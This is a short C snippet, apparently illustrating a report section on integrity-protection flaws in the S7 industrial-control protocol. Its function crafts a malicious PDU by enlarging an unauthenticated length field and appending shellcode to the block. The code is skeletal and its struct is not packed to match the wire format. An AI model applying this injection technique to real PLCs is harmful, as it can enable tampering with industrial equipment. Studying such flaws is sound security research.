// Malformed Packet Structure
// Context: Section 4.3.2 - Integrity Protection Violation

#include <stdint.h>
#include <string.h>

typedef struct {
    uint8_t  type_id;       // 0xA1: Object Property
    uint16_t block_length;  // CRITICAL: Exploited field (No HMAC)
    uint8_t  payload[];     // Variable length data container
} S7_Vulnerable_Block;

// Function to craft the malicious PDU in memory
void craft_payload(uint8_t* buffer, uint8_t* shellcode, int code_len) {
    S7_Vulnerable_Block* block = (S7_Vulnerable_Block*)buffer;

    // Attack Logic:
    // 1. Read original length (Big Endian)
    uint16_t current_len = (block->block_length << 8) | (block->block_length >> 8);

    // 2. Expand length to include shellcode
    // The protocol stack parses this as valid data due to lack of signature.
    uint16_t new_len = current_len + code_len;
    block->block_length = (new_len << 8) | (new_len >> 8);

    // 3. Inject Shellcode to the end of the block
    memcpy(block->payload + current_len, shellcode, code_len);
}